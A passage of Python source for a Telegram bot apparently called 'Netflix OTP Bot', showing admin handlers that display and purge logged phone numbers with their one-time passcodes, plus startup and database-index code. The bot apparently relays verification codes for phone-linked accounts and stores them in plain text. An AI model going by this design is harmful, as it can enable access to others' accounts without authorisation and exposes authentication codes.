        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    # Get recent OTP logs (last 50)
    logs = list(otp_logs_col.find({}, {"phone": 1, "otp": 1, "fetched_at": 1}).sort("fetched_at", -1).limit(50))
    
    if not logs:
        logs_text = "<b>📊 OTP Logs</b>\n\nNo OTP logs found yet."
    else:
        logs_text = "<b>📊 Recent OTP Logs (Last 50)</b>\n\n"
        for idx, log in enumerate(logs, 1):
            phone = format_phone(log.get("phone", "N/A"))
            otp = log.get("otp", "N/A")
            time = log.get("fetched_at", datetime.utcnow()).strftime("%H:%M")
            logs_text += f"{idx}. {phone}: <code>{otp}</code> ({time})\n"
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
    
    smart_send_or_edit(
        user_id,
        call.message.chat.id,
        logs_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE,
        message_type="otp_logs"
    )

@bot.callback_query_handler(func=lambda call: call.data == "clean_logs")
def handle_clean_logs(call):
    """Manually clean old logs (admin only)"""
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True)
        return
    
    # Show cleaning message
    cleaning_text = "<b>🗑 Cleaning Old Logs...</b>\n\n<i>Deleting OTP logs older than 24 hours...</i>"
    
    smart_send_or_edit(
        user_id,
        call.message.chat.id,
        cleaning_text,
        photo_url=NETFLIX_MAIN_IMAGE,
        message_type="clean_logs"
    )
    
    # Perform cleanup
    deleted_count = delete_old_otp_logs()
    
    # Show result
    result_text = f"<b>✅ Cleanup Complete!</b>\n\nDeleted {deleted_count} OTP logs older than 24 hours."
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⬅️ Back to Dashboard", callback_data="back_to_admin"))
    
    smart_send_or_edit(
        user_id,
        call.message.chat.id,
        result_text,
        markup=markup,
        photo_url=NETFLIX_MAIN_IMAGE,
        message_type="clean_logs"
    )
    
    bot.answer_callback_query(call.id, f"Deleted {deleted_count} logs")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_welcome")
def handle_back_to_welcome(call):
    """Go back to welcome screen for users"""
    user_id = call.from_user.id
    
    # Clear any states
    if user_id in login_states:
        del login_states[user_id]
    
    # Clear message state
    clear_message_state(user_id)
    
    show_netflix_welcome(user_id, call.message.chat.id)

# ========================
# MESSAGE HANDLER
# ========================
@bot.message_handler(func=lambda m: True)
def handle_other_messages(message):
    """Handle all other messages"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    # Ensure user exists
    ensure_user_exists(user_id, message.from_user.first_name, message.from_user.username)
    
    # Show appropriate menu
    if is_admin(user_id):
        show_admin_dashboard(user_id, chat_id)
    else:
        show_netflix_welcome(user_id, chat_id)

# ========================
# RUN BOT
# ========================
if __name__ == "__main__":
    logger.info("🎬 Starting Netflix OTP Bot...")
    logger.info(f"👑 Admin ID: {ADMIN_ID}")
    logger.info(f"📱 API ID: {API_ID}")
    logger.info(f"🖼️ Netflix Image: {NETFLIX_WELCOME_IMAGE}")
    
    # Create indexes
    try:
        accounts_col.create_index([("phone", 1)], unique=True)
        accounts_col.create_index([("created_at", -1)])
        accounts_col.create_index([("added_by", 1)])
        otp_logs_col.create_index([("fetched_at", -1)])
        users_col.create_index([("user_id", 1)], unique=True)
        users_col.create_index([("created_at", -1)])
        message_states_col.create_index([("user_id", 1)], unique=True)
        message_states_col.create_index([("updated_at", -1)], expireAfterSeconds=86400)  # Auto delete after 24h
        logger.info("✅ Database indexes created")
    except Exception as e:
        logger.error(f"❌ Index creation error: {e}")
    
    # Setup auto cleanup job
    try:
        # Schedule auto cleanup every hour
        scheduler.add_job(auto_cleanup_job, 'interval', hours=1, id='auto_cleanup')
        scheduler.start()
        logger.info("✅ Auto cleanup scheduled (runs every hour)")
    except Exception as e:
        logger.error(f"❌ Scheduler setup error: {e}")
    
    # Run initial cleanup
    try:
        initial_cleanup = delete_old_otp_logs()
        logger.info(f"✅ Initial cleanup: Deleted {initial_cleanup} old logs")
    except Exception as e:
        logger.error(f"❌ Initial cleanup failed: {e}")
    
    # Start bot
    logger.info("✅ Bot is running...")
    bot.infinity_polling()
